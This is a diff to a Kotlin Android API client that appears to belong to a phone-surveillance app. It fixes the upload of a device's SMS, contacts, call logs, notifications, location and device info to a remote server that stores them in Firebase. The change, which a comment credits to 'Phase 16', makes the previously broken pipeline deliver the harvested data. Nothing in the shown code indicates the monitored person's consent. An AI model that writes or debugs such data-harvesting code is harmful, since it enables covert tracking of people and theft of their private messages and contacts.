@@ -295,21 +295,37 @@ object ApiClient {
     }
 
     // ===== SEND DATA =====
-    suspend fun sendData(context: Context, command: String, data: Any?): Boolean {
+    //
+    // Sends a typed data payload to the server. The server's
+    // POST /api/data/{device_id} handler (api_device_data in
+    // Server/modules/api_handlers.py) reads the `type` field and routes the
+    // payload to the correct Firebase RTDB path:
+    //
+    //   type="location"     → store_location(device_id, data)
+    //   type="sms"          → store_sms(device_id, data)
+    //   type="contacts"     → store_contacts(device_id, data)
+    //   type="calls"        → store_calls(device_id, data)
+    //   type="notifications"→ store_notifications(device_id, data)
+    //   type="device_info"  → store_device_info(device_id, data)
+    //
+    // IMPORTANT: the server looks at `type`, NOT `command`. The previous
+    // implementation sent `"command": "sms"` and the server silently dropped
+    // the data (data_type was empty → no Firebase write). Fixed in Phase 16.
+    suspend fun sendData(context: Context, type: String, data: Any?): Boolean {
         return withContext(Dispatchers.IO) {
             try {
                 val deviceId = DeviceUtils.getDeviceId(context)
                 val body = mapOf(
                     "device_id" to deviceId,
-                    "command" to command,
+                    "type" to type,
                     "data" to data,
                     "timestamp" to System.currentTimeMillis()
                 )
-                val response = post("/data", body)
-                Log.d(TAG, "sendData response: '${response.take(200)}'")
+                val response = post("/data/$deviceId", body)
+                Log.d(TAG, "sendData[$type] response: '${response.take(200)}'")
                 true
             } catch (e: Exception) {
-                Log.e(TAG, "sendData error", e)
+                Log.e(TAG, "sendData[$type] error", e)
                 false
             }
         }
@@ -468,13 +484,17 @@ object ApiClient {
     }
 
     // ===== SEND LOCATION =====
+    //
+    // Sends a single location reading to the server via the typed data
+    // endpoint (POST /api/data/{device_id} with type="location"). The server
+    // routes this to store_location(device_id, data) in Firebase RTDB.
     suspend fun sendLocation(context: Context, lat: Double, lng: Double, accuracy: Float? = null) {
         withContext(Dispatchers.IO) {
             try {
                 val deviceId = DeviceUtils.getDeviceId(context)
-                val body = mutableMapOf<String, Any>(
+                val body = mapOf(
                     "device_id" to deviceId,
-                    "command" to "location",
+                    "type" to "location",
                     "data" to mapOf(
                         "latitude" to lat,
                         "longitude" to lng,
@@ -482,7 +502,7 @@ object ApiClient {
                         "timestamp" to System.currentTimeMillis()
                     )
                 )
-                val response = post("/data", body)
+                val response = post("/data/$deviceId", body)
                 Log.d(TAG, "sendLocation response: '${response.take(100)}'")
             } catch (e: Exception) {
                 Log.e(TAG, "sendLocation error", e)
